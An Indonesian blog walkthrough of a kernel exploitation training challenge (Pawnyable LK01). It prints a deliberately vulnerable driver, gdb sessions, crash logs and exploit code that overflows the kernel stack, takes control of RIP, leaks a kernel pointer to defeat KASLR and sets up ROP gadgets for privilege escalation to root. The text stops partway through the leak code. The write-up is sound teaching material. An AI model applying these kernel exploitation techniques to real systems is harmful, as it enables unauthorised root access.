---
title: "Linux Kernel PWN: Stack Overflow"
date: 2024-08-07 00:00:00 + 0800
tags: [pwn]
categories: [linux-kernel-pwn]
---

Introduction
---

Pada tantangan sebelumnya, kita sudah mempelajari hal mendasar tentang eksploitasi kernel linux, saya sarankan untuk pembaca untuk mempelajari eksploitasi biner diarea userland terlebih dahulu sebelum membaca tulisan ini, untuk menguatkan pengetahuan dasar. dan untuk tantangan kali ini, saya akan menulis langkah demi langkah untuk mengeksploitasi kerentanan stack overflow pada module kernel linux yang rentan. untuk file tantangannya saya mendapatkannya dari <a href="https://pawnyable.cafe/linux-kernel/LK01/welcome-to-holstein.html">sini</a>, atau bisa langsung mendownloadnya <a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01.tar.gz">disini</a>.

hal penting yang harus kita ketahui adalah, area stack pada kernel digunakan oleh semua driver atau perangkat. contohnya satu file deskriptor pada suatu modul bisa digunakan oleh modul lainnya, sehingga jika ada kebocoran memory seperti bug Use-after-free pada suatu driver. penyerang bisa memanfaatkan dan merusak objek lain untuk memicu bug tersebut. kerentanan seperti stack overflow pada kernel juga tidak jauh berbeda pada kerentanan serupa di area user, konsepnya adalah untuk mengontrol RIP sesuai dengan yang kita inginkan, tentunya untuk mendapatkan hak akses root.

---

Analisa Kerentanan
---

sebelum melangkah lebih jauh, saya sarankan anda untuk menggunakan script untuk mengcompress dan mendecompress file sistemnya terlebih dahulu yang saya sediakan pada tulisan sebelumnya. perlu diingat bahwa dalam tantangan kemarin file sistem terkompresi dengan nama initramfs.cpio, sedangkan pada tantangan kali ini adalah rootfs.cpio. anda tinggal mengubah namanya saja dalam script tersebut. jika sudah, ayo kita lihat file sumber yang disediakan dalam tantangan kali ini:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("Holstein v1 - Vulnerable Kernel Driver for Pawnyable");

#define DEVICE_NAME "holstein"
#define BUFFER_SIZE 0x400

char *g_buf = NULL;

static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}

static ssize_t module_read(struct file *file,
                        char __user *buf, size_t count,
                        loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_read called\n");

  memcpy(kbuf, g_buf, BUFFER_SIZE);
  if (_copy_to_user(buf, kbuf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_write called\n");

  if (_copy_from_user(kbuf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }
  memcpy(g_buf, kbuf, BUFFER_SIZE);

  return count;
}

static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}

static struct file_operations module_fops =
  {
   .owner   = THIS_MODULE,
   .read    = module_read,
   .write   = module_write,
   .open    = module_open,
   .release = module_close,
  };

static dev_t dev_id;
static struct cdev c_dev;

static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
    printk(KERN_WARNING "Failed to register device\n");
    return -EBUSY;
  }

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    printk(KERN_WARNING "Failed to add cdev\n");
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}

static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}

module_init(module_initialize);
module_exit(module_cleanup);

```
kita dapat melihat pada fungsi module_open() bahwa variable global g_buf dialokasikan menggunakan kmalloc dengan ukuran BUFFER_SIZE = 0x400 dan dengan flag GFP_KERNEL

```bash
g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
```
flag GFP_KERNEL (Get Free Page) dimaksudkan untuk alokasi tujuan umum. dan kita juga bisa melihat modul_write() dan module_read(), kedua fungsi itu digunakan untuk membaca dan menulis buffer yang kita kirim, bagian yang rentan dikedua fungsi tersebut cukup jelas.

```c
fungsi module_read()
...
 memcpy(kbuf, g_buf, BUFFER_SIZE);
  if (_copy_to_user(buf, kbuf, count)) { //count menyebabkan overflow
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }
....
```

variable g_buf disalin kepada variable kbuf yang nantinya akan dikirim ke user menggunakan copy_to_user(), hanya saja tidak ada validasi untuk count yang nanti user terima yang artinya kita bisa membaca lebih dari ukuran BUFFER_SIZE(0x400).

```c
fungsi module_write()
...
g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }
...
```
didalam fungsi ini, kita juga dapat menulis lebih dari ukuran BUFFER_SIZE(0x400), dalam hal ini jelas. kita bisa melakukan pembacaan dan penulisan sewenang-wenang untuk meningkatkan hak istimewa.

```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}
```
dan fungsi module_close() adalah fungsi untuk membebaskan g_buf yang sebelumnya dialokasikan, atau menggunakan fungsi close() nanti. 

---

Exploiting
---
baiklah, untuk pertama sebelum kita berinteraksi dengan module ini, kita perlu mengatur hal lainnya untuk melakukan debugging... buka file ini:

```bash
nano rootfs/etc/init.d/S99pawnyable

```

kita harus menonaktifkan dmesg untuk mengetahui address module kernel dan pesan dari module tersebut.


```bash
echo 2 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

```
menjadi
```bash
#echo 2 > /proc/sys/kernel/kptr_restrict
#echo 1 > /proc/sys/kernel/dmesg_restrict

```
jangan lupa untuk menyetel setuidgid ke 0 untuk akses root saat debugging. atur kembali ke 1337 jika eksploit sudah siap nanti.

```bash
setsid cttyhack setuidgid 1337 sh

```
untuk proses debugging nanti, kita harus menonaktifkan kaslr agar alamat fungsi yang ada didalam kernel tidak berubah-ubah. aktifkan kembali saat eksploit sudah siap nanti.

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=0 nokaslr" \
    -no-reboot \
    -cpu qemu64,+smap,+smep \
    -smp 1 \
    -monitor /dev/null \
    -initrd rootfs_updated.cpio \
    -net nic,model=virtio \
    -net user


```
diatas, KPTI di nonaktifkan juga saat debugging. aktifkan lagi saat eksploit sudah siap. baik, sekarang kita akan berinteraksi dengan module kernel dengan kode ini:

```c
#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<string.h>
#include<sys/ioctl.h>

#define ERR(msg)                                                               \
     do {                                                                      \
     perror(msg);                                                              \
     exit(EXIT_FAILURE);                                                       \
    } while (0)


#define DEV "/dev/holstein"

int main()
{
    char buff[0x100];
    memset(buff,0,sizeof(buff));

    int fd = open(DEV, O_RDWR);
    if(fd==-1){
        ERR("open(DEV)");
    }else{
        puts("perangkat terbuka");
    }

    write(fd,"Hello World",12);

    close(fd); //module_close() akan dipanggil lalu g_buff dibebaskan menggunakan kfree()
}

```

compress kembali file system:

```bash
./compress.sh
```
lalu jalankan ```./run.sh```

setelah qemu muncul, jalankan exploit kita:

```bash
/ # ./exploit
perangkat terbuka

```
lalu kita lihat pesan module dengan ```dmesg tail``` dan ini yang akan muncul dibagian paling bawah:

```bash
...
vuln: loading out-of-tree module taints kernel.
module_open called
module_write called
module_close called
module_open called
module_write called
module_close called

```

anda mungkin bertanya-tanya, kenapa "hello world" kita yang kita kirim menggunakan fungsi write() tidak muncul? untuk mengetahui dan melihat itu, kita harus menggunakan gdb untuk mendebug fungsi module_write()

untuk melakukan debugging, buka script run.sh dan tampbahkan opsi s dan S :

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -s \
    -S  \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=0 nokaslr" \
    -no-reboot \
    -cpu qemu64,+smap,+smep \
    -smp 1 \
    -monitor /dev/null \
    -initrd rootfs_updated.cpio \
    -net nic,model=virtio \
    -net user

```
perlu diketahui, setiap kali kita melakukan perubahan pada file system, kita harus mengcompressnya kembali, agar perubahan yang terjadi pada folder system rootfs atau initramfs di perbarui kedalam fila system yang terkompresi, karena file system rootfs.cpio lah yang digunakan sebagai lingkungan dari kernel tersebut.

untuk debugging, gunakan dua terimnal. satu untuk menjalankan qemu dan satu untuk mendebug vmlinux nya.

```bash
./run.sh
```

```bash
gdb vmlinux
target remote:1234 lalu tekan 'c' agar qemu mulai booting 
```

setelah qemu berjalan, ketik ini:

```bash
...
/ # cat /proc/kallsyms | grep vuln

ffffffffc0000000 t module_open	[vuln]
ffffffffc0000069 t module_read	[vuln]
ffffffffc0000120 t module_write	[vuln]
ffffffffc000020f t module_close	[vuln]
ffffffffc0000241 t module_cleanup	[vuln]
ffffffffc0000241 t cleanup_module	[vuln]


```

lalu pada terimnal yang menjalankan gdb, ketik ```ctrl+c``` untuk menghentikan qemu dan kita bisa menempatkan breakpoint yang kita inginkan, karena kita ingin mendebug fungsi module_write() kita ketik ```b *0xffffffffc0000120``` lalu enter. setelah breakpoint terpasang tekan ```c``` agar qemu jalan kembali, lalu jalankan exploit otomatis akan memicu breakpoint yang kita pasang. dan ini yang gdb tampilkan, maaf karena saya tidak menampilkan gambar, karena lebih praktis menampilkan kode salinan:

```bash
 RAX  12
 RBX  0xffff88800334fc00 ◂— 0
*RCX  0
*RDX  127
*RDI  0xffff8880032b3c00 ◂— 0x1900000080
*RSI  0xffffc90000567ea8 —▸ 0xffffc90000567ee8 —▸ 0xffffc90000567f20 —▸ 0xffffc90000567f30 —▸ 0xffffc90000567f48 ◂— ...
*R8   0xffffffff81ea4608 ◂— 0xc0000000ffffefff
*R9   0x4ffb
*R10  0xfffff000
*R11  0x3fffffffffffffff
 R12  12
 R13  0
 R14  0x48603a ◂— 'Hello World'
 R15  0xffffc90000567ef8 ◂— 0
 RBP  0xffffc90000567ee8 —▸ 0xffffc90000567f20 —▸ 0xffffc90000567f30 —▸ 0xffffc90000567f48 ◂— 0
*RSP  0xffffc90000567eb8 ◂— 0
*RIP  0xffffffff8113d4d2 ◂— 0x367fed854dc58949
──────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────
 ► 0xffffffff8113d4d2    mov    r13, rax     R13 => 0xc
   0xffffffff8113d4d5    test   r13, r13     0xc & 0xc     EFLAGS => 0x206 [ cf PF af zf sf IF df of ]
   0xffffffff8113d4d8  ✔ jg     0xffffffff8113d510          <0xffffffff8113d510>
    ↓
   0xffffffff8113d510    test   byte ptr [rbx + 0x47], 4     0 & 4     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0xffffffff8113d514    jne    0xffffffff8113d4da          <0xffffffff8113d4da>
 
   0xffffffff8113d516    mov    rdi, qword ptr [rbx + 0x18]     RDI, [0xffff88800334fc18] => 0xffff888002b47a80 ◂— 0x200500008
   0xffffffff8113d51a    lea    r11, [rbx + 0x10]               R11 => 0xffff88800334fc10 —▸ 0xffff8880027222a0 —▸ 0xffff888002804300 ◂— ...
   0xffffffff8113d51e    mov    r10d, 2                         R10D => 2
   0xffffffff8113d524    mov    r9, qword ptr [rdi + 0x30]      R9, [0xffff888002b47ab0] => 0xffff888003390ac0 ◂— 0xd21b6
   0xffffffff8113d528    movzx  eax, word ptr [r9]              EAX, [0xffff888003390ac0] => 0x21b6
   0xffffffff8113d52c    and    ax, 0xf000                      AX => 0x2000
───────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0xffffc90000567eb8 ◂— 0
01:0008│-028 0xffffc90000567ec0 —▸ 0xffff88800334fc00 ◂— 0
02:0010│-020 0xffffc90000567ec8 —▸ 0xffff88800334fc00 ◂— 0
03:0018│-018 0xffffc90000567ed0 —▸ 0x48603a ◂— 'Hello World'
04:0020│-010 0xffffc90000567ed8 ◂— 0xc /* '\x0c' */
05:0028│-008 0xffffc90000567ee0 ◂— 0
06:0030│ rbp 0xffffc90000567ee8 —▸ 0xffffc90000567f20 —▸ 0xffffc90000567f30 —▸ 0xffffc90000567f48 ◂— 0
07:0038│+008 0xffffc90000567ef0 —▸ 0xffffffff8113d7d3 ◂— 0x978c08548c58949

```
saya menggunakan <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> sebagai ekstensi gdb, perhatikan status registernya:

```bash
 RAX  12
 RBX  0xffff88800334fc00 ◂— 0
*RCX  0
*RDX  127
*RDI  0xffff8880032b3c00 ◂— 0x1900000080
*RSI  0xffffc90000567ea8 —▸ 0xffffc90000567ee8 —▸ 0xffffc90000567f20 —▸ 0xffffc90000567f30 —▸ 0xffffc90000567f48 ◂— ...
*R8   0xffffffff81ea4608 ◂— 0xc0000000ffffefff
*R9   0x4ffb
*R10  0xfffff000
*R11  0x3fffffffffffffff
 R12  12
 R13  0
 R14  0x48603a ◂— 'Hello World'
 R15  0xffffc90000567ef8 ◂— 0
 RBP  0xffffc90000567ee8 —▸ 0xffffc90000567f20 —▸ 0xffffc90000567f30 —▸ 0xffffc90000567f48 ◂— 0
*RSP  0xffffc90000567eb8 ◂— 0
*RIP  0xffffffff8113d4d2 ◂— 0x367fed854dc58949
```

register ```RAX``` menyimpan nilai 12 byte dalam desimal, itu adalah panjang karakter dari "Hello World\n". dan register ```R14``` sendiri menyimpan offset ```0x48603a``` yang berisi dari string ```Hello World``` itu sendiri. tekan ```finish``` untuk melihat status register yang sebenarnya. lalu ketik:

```bash
pwndbg> x/20gx $r14
0x48603a:	0x6f57206f6c6c6548	0x0000000000646c72
0x48604a:	0x0000000000000000	0x0000000000000000
0x48605a:	0xbd71000000000000	0xbe43fff7bd3afff7
0x48606a:	0xbd33fff7be2afff7	0xbe11fff7bd93fff7
0x48607a:	0xbcb1fff7be5efff7	0xbcb1fff7bcb1fff7
0x48608a:	0xbcb1fff7be51fff7	0xbe94fff7be51fff7
0x48609a:	0xbe8afff7be51fff7	0xbe80fff7be51fff7
0x4860aa:	0xbe6cfff7be76fff7	0xbe58fff7be62fff7
0x4860ba:	0xbc71fff7be9efff7	0xbc71fff7bc71fff7
0x4860ca:	0xbc71fff7be11fff7	0xbe54fff7be11fff7
pwndbg> x/s $r14
0x48603a:	"Hello World" -> data yang kita kirim menggunakan write() tadi

```

sekarang, karena kita sudah tahu dimana kerentanan dan cara berkomunikasi dengan module tersebut. ayo kita coba melakukan penulisan, sebelumnya ukuran BUFFER_SIZE dalam module tersebut adalah 0x400 dan tidak ada pengecekan ukuran, bagaimana jika kita menulis data yang melebihi ukuran tersebut? ayo coba.

```c
#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<string.h>
#include<sys/ioctl.h>

#define ERR(msg)                                                               \
     do {                                                                      \
     perror(msg);                                                              \
     exit(EXIT_FAILURE);                                                       \
    } while (0)



int main()
{
    char buff[0x800];
    memset(buff,0x41,sizeof(buff));

    int fd = open("/dev/holstein", O_RDWR);
    if(fd==-1){
        ERR("open(holstein)");
    }else{
        puts("perangkat terbuka");
    }

    write(fd,buff,0x800);

    close(fd); //module_close() akan dipanggil lalu g_buff dibebaskan menggunakan kfree()
}


```

lalu jalankan qemu dan gdb seperti tadi, pasang kembali breakpoint dan jalankan exploit, dan ini yang saya dapatkan:

```bash
perangkat terbuka
BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..()
kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP NOPTI
CPU: 0 PID: 162 Comm: exploit Tainted: G           O      5.10.7 #1
Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-14
RIP: 0010:__memset+0x24/0x30
Code: cc cc cc cc cc cc 66 66 90 66 90 49 89 f9 48 89 d1 83 e2 07 48 c1 e9 03 43
RSP: 0018:ffffc9000054fa58 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 0000000000000558 RCX: 0000000000000055
RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffffc90000550000
RBP: ffffc9000054fa78 R08: ffffffff81ea4608 R09: ffffc90000550000
R10: 00000000fffff000 R11: 3fffffffffffffff R12: ffffc9000054faa8
R13: 00000000000002a8 R14: 00007fff4999f780 R15: ffffc9000054fef8
FS:  00000000004ba380(0000) GS:ffff888007600000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffc90000550000 CR3: 0000000003240000 CR4: 00000000003006f0
Call Trace:
 ? _copy_from_user+0x70/0x80
 module_write+0x75/0xef [vuln]
Modules linked in: vuln(O)
---[ end trace 9f9406b38e9d8c1e ]---
RIP: 0010:__memset+0x24/0x30

```
qemu menunjukkan pesan kesalahan ```BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..()
kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP NOPTI``` artinya kernel menjadi crash karena register tertentu dan akarnya adalah pointer ____ptrval____, penting untuk memahami pesan error saa kita melakukan debugging, jadi karena pesan kesalahannya tidak sesuai dengan apa yang saya inginkan, mari kita ubah kode kita menjadi:

```c
#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<string.h>
#include<sys/ioctl.h>

#define ERR(msg)                                                               \
     do {                                                                      \
     perror(msg);                                                              \
     exit(EXIT_FAILURE);                                                       \
    } while (0)



int main()
{
    char buff[0x420];
    memset(buff,0x41,sizeof(buff));

    int fd = open("/dev/holstein", O_RDWR);
    if(fd==-1){
        ERR("open(DEV)");
    }else{
        puts("perangkat terbuka");
    }

    write(fd,buff,0x420);

    close(fd); //module_close() akan dipanggil lalu g_buff dibebaskan menggunakan kfree()
}

```

kita jalankan kembali qemu dan gdb dan picu breakpoint. akhirnya kita mendapatkan masalah seperti ini:

```bash
perangkat terbuka
general protection fault: 0000 [#1] PREEMPT SMP NOPTI
CPU: 0 PID: 162 Comm: exploit Tainted: G           O      5.10.7 #1
Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-14
RIP: 0010:0x4141414141414141
Code: Unable to access opcode bytes at RIP 0x4141414141414117.
RSP: 0018:ffffc90000567eb8 EFLAGS: 00000202
RAX: 0000000000000420 RBX: ffff8880033c1500 RCX: 0000000000000000
RDX: 000000000000007f RSI: ffffc90000567ea8 RDI: ffff8880033cd000
RBP: 4141414141414141 R08: ffffffff81ea4608 R09: 0000000000004ffb
R10: 00000000fffff000 R11: 3fffffffffffffff R12: 0000000000000420
R13: 0000000000000000 R14: 00007ffd9bbbbca0 R15: ffffc90000567ef8
FS:  00000000004ba380(0000) GS:ffff888007600000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 4141414141414141 CR3: 000000000336a000 CR4: 00000000003006f0
Call Trace:
 ? ksys_write+0x53/0xd0
 ? __x64_sys_write+0x15/0x20
 ? do_syscall_64+0x38/0x50
 ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
Modules linked in: vuln(O)
---[ end trace aa16eb9ba4a7f0db ]---
RIP: 0010:0x4141414141414141
Code: Unable to access opcode bytes at RIP 0x4141414141414117.

```

seperti saat melakukan fuzzing buffer overflow pada userland, di kerneland juga kita mencoba untuk menghitung berapa byte yang diperlukan sampai kita mampu menimpa register RIP.

jadi, kita akan mengubah ukuran buff pada kode eksploit kita menjadi 

```c
 char buff[0x410];
 memset(buff,0x41,sizeof(buff));
 ...
 write(fd,buff,0x410);
```

karena kita ingin mengetahui dalam berapa byte kita bisa mengontrol register RIP. jadi saya menggunakan ida untuk mengetahui address dari copy_from_user yang ada didalam fungsi module_write. dan juga pada bagian intruksi retn yang ada pada offset 0xffffffffc000020a 

<img src="{{ site.url }}{{ site.baseurl }}/images/ida_write.png" alt="">

jadi, kita akan memberi breakpoint pada address 0xffffffffc0000190, karena address base module vuln.ko adalah 0xffffffffc0000000 ditambah dengan offset copy_from_user yang terletak pada 0x190.

```bash
/ # cat /proc/modules

vuln 16384 0 - Live 0xffffffffc0000000 (O)
/ # 

```

kita akan pasang breakpoint kembali pada gdb

```bash
b *0xffffffffc0000190 dan b *0xffffffffc000020a
```
lalu picu module_write dengan cara menjalankan exploit kita, dan ini hasilnya:

```bash
*RAX  0xffffc90000557aa8 ◂— 0
*RBX  0xffff8880033a2000 ◂— 0
*RCX  0x7ffed2353170 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDX  0x410
*RDI  0xffffc90000557aa8 ◂— 0
*RSI  0x7ffed2353170 ◂— 0x4141414141414141 ('AAAAAAAA')
*R8   0xffffffff81ea4608 ◂— 0xc0000000ffffefff
*R9   0x4ffb
*R10  0xfffff000
*R11  0x3fffffffffffffff
*R12  0x410
 R13  0
*R14  0x7ffed2353170 ◂— 0x4141414141414141 ('AAAAAAAA')
*R15  0xffffc90000557ef8 ◂— 0
*RBP  0xffffc90000557ea8 —▸ 0xffffc90000557ee8 —▸ 0xffffc90000557f20 —▸ 0xffffc90000557f30 —▸ 0xffffc90000557f48 ◂— ...
*RSP  0xffffc90000557a88 —▸ 0xffffc90000557ef8 ◂— 0
*RIP  0xffffffffc0000190 ◂— 0xc08548c125c17be8
```
tekan tombol ```c``` dan qemu akan menampilkan pesan kesalahan lagi:

```bash
RIP: 0010:0x4141414141414141
Code: Unable to access opcode bytes at RIP 0x4141414141414117.
RSP: 0018:ffffc9000050feb8 EFLAGS: 00000202
RAX: 0000000000000410 RBX: ffff8880032ced00 RCX: 0000000000000000
RDX: 000000000000007f RSI: ffffc9000050fea8 RDI: ffff8880033d5400
RBP: 4141414141414141 R08: ffffffff81ea4608 R09: 0000000000004ffb
R10: 00000000fffff000 R11: 3fffffffffffffff R12: 0000000000000410
R13: 0000000000000000 R14: 00007ffdf552f6a0 R15: ffffc9000050fef8
FS:  00000000004ba380(0000) GS:ffff888007600000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 4141414141414141 CR3: 0000000003240000 CR4: 00000000003006f0


```

register RIP memang tertimpa, tapi yang saya ingin ketahui adalah berapa byte yang kita perlukan untuk mengontrol RIP?. 0x410 masih terlalu besar, lalu saya mencoba lagi dengan mengirim buffer sebanyak 0x408. ini hasilnya:

```bash
RIP: 0010:vfs_write+0xe6/0x280
Code: df e8 8e 35 8c 00 49 89 c5 4d 85 ed 7f 36 48 8b 53 20 0f b7 02 66 25 00 f9
RSP: 0018:4141414141414119 EFLAGS: 00000a87
RAX: 0000000000000408 RBX: ffff888003387800 RCX: ffff8880024cc800
RDX: ffff88800337eac0 RSI: 0000000000000000 RDI: ffff888002b479c0
RBP: 4141414141414141 R08: ffffffff81ea4608 R09: ffff88800337eac0
R10: 0000000000000002 R11: ffff888003387810 R12: 0000000000000408
R13: 0000000000000408 R14: 00007ffeba2c60e0 R15: ffffc90000557ef8
FS:  00000000004ba380(0000) GS:ffff888007600000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 4141414141414108 CR3: 000000000334c000 CR4: 00000000003006f0

```

menariknya adalah nilai pada RSP juga tertimpa kali ini, dan RIP berisi suatu pointer fungsi dari vfs_write, yang bisa kita manfaatkan untuk menghitung alamat basis kernel. kita bisa mengontrol rip setelah mengirim buffer sebesar 0x408 byte. itu yang saya maksudkan, jadi ayo kita buat exploitnya yang sekaligus membypass mitigasi KASLR, KPTI, SMAP dan SMEP.

tapi pertama, kita harus mencari gadget untuk melakukan ROP. saya menggunakan ROPgadget dan hanya mengambil offset dasarnya saja:

```bash
ROPgadget --binary ./vmlinux | grep "pop rdi"
ROPgadget --binary ./vmlinux | grep "pop rcx"
ROPgadget --binary ./vmlinux | grep "mov rdi"
```
lalu kita jalankan qemu untuk mencari offset:

```bash
cat /proc/kallsyms | grep commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
cat /proc/kallsyms | grep swapgs
```

ini contohnya:

```c
unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long commit_creds; //0x6e390
unsigned long prepare_kernel_cred; //0x6e240
unsigned long pop_rdi; //0x27bbdc                                   
unsigned long pop_rcx; //0x32cdd3
unsigned long mov_rdi_rax_rep_movsq; //0x60c96b
unsigned long swapgs; //0x800e26   
```
ini adalah catatan penting dari pembuat tantangan ini tentang menemukan gadget rop, ```Kebanyakan alat untuk menemukan gadget ROP tidak diuji dengan baik terhadap biner dalam jumlah besar seperti kernel. Hati-hati, karena ada banyak keluaran yang salah, seperti melewatkan instruksi yang tidak didukung atau menghilangkan awalan instruksi. Selain itu, sebagian besar alat tidak dapat menentukan dengan tepat apakah suatu gadget benar-benar termasuk dalam area yang dapat dieksekusi di ruang kernel, jadi berhati-hatilah dengan gadget dengan alamat yang besar (misalnya 0xffffffff81cXXXYYY).``` baik, pertama kita akan membocorkan alamat basis kernel dengan kode ini:

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ERR(msg)                                                               \
  do {                                                                         \
    perror(msg);                                                               \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long prepare_kernel_creed;  //0x6e240
unsigned long commit_creds; //0x6e390
unsigned long pop_rdi; //0x27bbdc
unsigned long pop_rcx; //0x32cdd3
unsigned long mov_rdi_rax_rep_movsq; //0x60c96b
unsigned long kpti_trampoline; //0x800e26
unsigned long kbase, vfs_read;
int global_fd;

static void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_rsp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
}

static void shell() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("ROOOOT");
  execve("/bin/sh", argv, envp);
}

void leak()
{
  global_fd = open("/dev/holstein",O_RDWR);
  if(global_fd == -1){
    ERR("open(holstein)");
  }else{
    puts("/dev/holstein terbuka");
  }

  //membocorkan kernel base
  printf("[*] tahap pertama, leaked\n");
  char buff[0x500];
  memset(buff,'A',0x480);
  read(global_fd,buff,0x410);

  for(int i=0;i < 0x480; i++){
     printf("[*]leaked = %d-> 0x%x: 0x%016lx\n",i,i,*(unsigned long*)(buff + i));
  }

}

int main()
{
    leak();

    return EXIT_SUCCESS;
}

```


kita menemukan address yang menarik disini:

```bash
 ► 0 0xffffffffc0000069
   1 0xffffffff8113d33c
   2      0x100000000
   3 0xffff88800334aa00
   4 0xffff88800334aa00
   5   0x7ffccb164280
   6            0x410
   7              0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/40gx $rsp
0xffffc90000567eb0:	0xffffffff8113d33c	0x0000000100000000
0xffffc90000567ec0:	0xffff88800334aa00	0xffff88800334aa00
0xffffc90000567ed0:	0x00007ffccb164280	0x0000000000000410
0xffffc90000567ee0:	0x0000000000000000	0xffffc90000567f20
0xffffc90000567ef0:	0xffffffff8113d6e3	0x0000000000000000
0xffffc90000567f00:	0x0000000000000000	0xffffc90000567f58
0xffffc90000567f10:	0x0000000000000000	0x0000000000000000
0xffffc90000567f20:	0xffffc90000567f30	0xffffffff8113d775
0xffffc90000567f30:	0xffffc90000567f48	0xffffffff8160bed8
0xffffc90000567f40:	0x0000000000000000	0x0000000000000000
0xffffc90000567f50:	0xffffffff8180007c	0x0000000000000001
0xffffc90000567f60:	0x00000000004ad868	0x00007ffccb1648c8
0xffffc90000567f70:	0x00007ffccb1648b8	0x00007ffccb164790
0xffffc90000567f80:	0x0000000000000001	0x0000000000000246
0xffffc90000567f90:	0x0000000000000001	0x0000000000000000
0xffffc90000567fa0:	0x0000000000000000	0xffffffffffffffda
0xffffc90000567fb0:	0x0000000000421071	0x0000000000000410
0xffffc90000567fc0:	0x00007ffccb164280	0x0000000000000003
0xffffc90000567fd0:	0x0000000000000000	0x0000000000421071
0xffffc90000567fe0:	0x0000000000000033	0x0000000000000246
```

kita tekan "c" pada gdb, dan qemu akan menampilkan daftar address yang kita bocorkan, dan kita menemukan ini:

```bash
....
[*]leaked = 1032-> 0x408: 0xffffffff8113d33c
....
```
ingat saat kita melakukan penulisan diluar batas sebelumnya? ketika mengirim data menggunakan write hingga menimpa RIP dengan vfs_write, saya yakin kali ini kita melakukan pembacaan diluar batas hingga membocorkan vfs_read. karena alamat kernel hanya hanya mengarah kesekitar 0xffffffff810000000, jadi dalam alamat RSP diatas, ada beberapa yang mengarah ke alamat yang kita maksud seperti ```0xffffffff8113d33c```,```0xffffffff8113d6e3``` dan ```0xffffffff8113d775```.

untuk memastikkannya, ayo kita sedikit ubah kode exploit kita yang sebelumnya untuk menghitung offset kernel base dan gadget rop lainnya:

```c
...
for(int i=0;i < 0x480; i++){
       //printf("[*]leaked = 0x%016lx\n",*(unsigned long*)(buff + i * 8) & 0xfff);
       if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x33c){
       vfs_read = *(unsigned long*)(buff + i * 8);
       break;
       }
    }

